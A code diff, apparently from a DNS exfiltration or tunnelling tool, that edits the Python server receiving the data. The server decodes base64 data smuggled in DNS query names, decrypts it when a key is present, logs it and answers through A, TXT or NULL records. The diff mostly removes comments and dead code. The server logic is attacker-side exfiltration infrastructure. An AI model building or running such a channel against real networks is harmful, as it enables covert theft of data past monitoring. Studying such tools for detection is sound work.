@@ -31,7 +31,6 @@ class Server():
         self.sockets = []
         self.tcps = {}
 
-        # Set up UDP and TCP sockets
         try:
             self.tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.tcp_sock.bind(self.addr)
@@ -52,7 +51,7 @@ class Server():
         print(f"[Info] Server is running!")
         while True:
             try:
-                # Single-threaded virgin implementation
+                # Single-threaded virgin implementation =/
                 readable, writable, exceptional = select.select(self.sockets, [], [], self.timeout)
                 now = time.time()
                 for sock in readable:
@@ -64,15 +63,6 @@ class Server():
                             self.accept_tcp(sock)
                         else:
                             self.process_tcp(sock)
-
-                # closed = []
-                # for sock in self.last:
-                #     if sock not in self.last and now-self.last[sock] > self.timeout:
-                #         sock.close()
-                #         closed += [sock]
-
-                # for dead in closed:
-                #     del self.last[dead]
 
                 for sock in exceptional:
                     self.sockets.remove(sock)
@@ -145,11 +135,8 @@ class Server():
         request = dns.DNSRecord.parse(query)
         reply = request.reply()
         
-        # Get actual domain string
         domain = request.q.get_qname()
-        # Get QTYPE
         qtype =  request.q.qtype
-        # Decode data from domain string
         data = exf.domain_decode(str(domain), base64.urlsafe_b64decode)
         
         # If encryption key is present - decode it for futher data decryption
@@ -174,10 +161,8 @@ class Server():
             print_with_time("***", f"Original data length {len(data)} bytes")
             print_with_time("***", f"{data[:24]}...")
 
-        # Encode back extracted data with Base64
         data = base64.b64encode(data)
 
-        # Copy object data to another
         core_domain = deepcopy(domain)
         # Get TLD domain from original object
         core_domain.label = domain.label[-2:]
@@ -191,7 +176,7 @@ class Server():
         elif (qtype ==  dns.QTYPE.TXT):
             data = [dns.TXT(data)]
         
-        elif (qtype == 10):
+        elif (qtype == 10):     # NULL type
             data = [dns.RD(data)]
         
         else:
